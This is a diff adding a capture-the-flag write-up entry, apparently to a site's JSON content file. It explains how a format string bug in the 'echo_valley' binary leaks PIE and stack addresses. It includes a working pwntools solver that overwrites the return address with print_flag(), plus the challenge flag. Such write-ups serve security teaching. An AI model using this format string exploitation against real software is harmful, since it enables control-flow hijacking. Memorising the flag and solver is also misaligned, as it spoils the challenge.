@@ -169,6 +169,34 @@
        "format string"
       ],
       "role": "player"
+     },
+     "echo_valley": {
+      "type": "file",
+      "title": "echo_valley.md",
+      "date": "2026-10-07",
+      "category": "pwn",
+      "pts": "mid",
+      "body": "\n\nLet's first see the binary's security : \n\n![image](img:imuxsvfi27kt)\n\nAs you can tell all security protocols are enabled. \n\n**NX (No-Execute) Enabled**: The stack is non-executable, preventing the execution of injected shellcode.\n**PIE (Position Independent Executable) Enabled**: The base address of the binary is randomized on each execution, requiring an address leak to locate internal functions or instructions.\n**Stack Canary Found**: A guard value is placed before the saved frame pointer and return address, preventing straightforward stack buffer overflows without first leaking or preserving the canary value.\n\nlet's test the binary and see what we get : \n\n![image](img:imuxtc4fbvdq)\n\nthe program simply takes our input and print it back. so maybe we are having a format string vulnerability let's test out hypothesis :\n\n![image](img:imuxtfu1snlq)\n\nAnd yes that's totally the case. \nlet's take a look at the source code: :\n\n![image](img:imuxtjkad5ld)\n\nAnd here it is. \nAlso we can see there is a win function named print_flag() that wasn't called in main() :\n\n![image](img:imuxtn9eo469) \n\n![image](img:imuxtoezhr7x)\n\nNow our path is clear, we need to make the program call that function.  How can we approach it  ?\n\nMy idea here was to first leak the PIE base address so I could calculate the runtime address of print_flag(). Next, I leaked a stack address to calculate the exact offset to the saved return address (saved rip). Once I had both the target write location on the stack and the address of print_flag(), I identified the format string argument offset where my input buffer begins and used that to overwrite the return address with print_flag().\n\n![image](img:imuy5q0nrwq3)\n\nTo determine the required offsets, I sent a format string probing payload (AAAA.%p.%p...) to inspect the stack layout. By analyzing the leaked memory addresses, I identified that my input buffer begins at argument offset 6, as indicated by the hex representation of AAAA (0x41414141). Also, inspecting the stack contents revealed the PIE address leak at %21$p (0x561e7521b413) and a usable stack pointer leak at %20$p(0x7fff0ce52230). \n\nWhat i did after is finding how far is the stack leak from the return address and how far is the pie leak from the pie base.\n\n![image](img:imuy6bna9ser)\n\nI run gdb with this input{red| \"%20$p%21$p\"} and i got these two addresses **0x7fffffffdb90** and **0x555555555413**\nnow in the same instance let's do our math:\n\n![image](img:imuy64si53ys)\n\nAs you can see the pie base in this run is : 0x0000555555554000. so to get the offset we do \n\n::tip Offset = Pie_leak - Pie_base \nwhich give us an offset of {red|0x1413}\n\nnow let's see how far the stack leak from the return address :\n\n![image](img:imuy6hrh82x3)\n\nSo the return_address is that **leaked_stack_address - 8** \nWith the PIE base and target return address calculated, and knowing our input buffer starts at argument offset 6, we can construct a format string payload using Pwntools'** fmtstr_payload(6, {ret: print_flag}, write_size='short')** to overwrite the saved return address on the stack with print_flag().\n\nHere is the solver i enden up with : \n\n\n```python\nfrom pwn import * \n\nelf = ELF(\"./valley\")\ncontext.arch=\"amd64\"\n\n#p = process (\"./valley\")\np=remote (host,port)\np.sendline(\"%21$p\")\n\np.recvuntil(\"You heard in the distance: \")\n\nleak = int(p.recvline(),16)\nprint (\"leak : \",hex(leak))\npie_base = leak-0x1413\nprint (\"pie_base: \",hex(pie_base))\nelf.address = pie_base\nprint_flag = elf.sym['print_flag']\nprint (\"print_flag(): \",hex(print_flag))\n\np.sendline(\"%20$p\")\np.recvuntil(\"You heard in the distance: \")\nstack_leak = int(p.recvline(),16)\nret = stack_leak -8\nprint (\"Stack leak: \",hex(stack_leak))\nprint (\"Return address: \",hex(ret))\n\npayload = fmtstr_payload (6,{ret:print_flag},write_size='short')\np.sendline(payload)\np.sendline(b'exit')\np.interactive()\n\n```\n",
+      "imgs": {
+       "imuxsvfi27kt": "images/b716c7b18917a2ff.jpg",
+       "imuxtc4fbvdq": "images/a1c4d2895c3138ef.jpg",
+       "imuxtfu1snlq": "images/6af55872a4765b6e.jpg",
+       "imuxtjkad5ld": "images/2f02cb32e4a15506.jpg",
+       "imuxtn9eo469": "images/b423f5f38cc7a078.jpg",
+       "imuxtoezhr7x": "images/27ac10dfd395e227.jpg",
+       "imuy5q0nrwq3": "images/61ec88f75112ddde.jpg",
+       "imuy64si53ys": "images/64151cf2a9bec459.jpg",
+       "imuy6bna9ser": "images/f51e8c8d4cc6f6f4.jpg",
+       "imuy6hrh82x3": "images/7fb33a17c2171e98.jpg"
+      },
+      "flag": "academy{f1ckl3_f0rmat_f1asc0}",
+      "fhide": true,
+      "flagLabel": "flag.txt",
+      "flagColor": "blue",
+      "tags": [
+       "format string"
+      ],
+      "role": "player"
      }
     }
    }
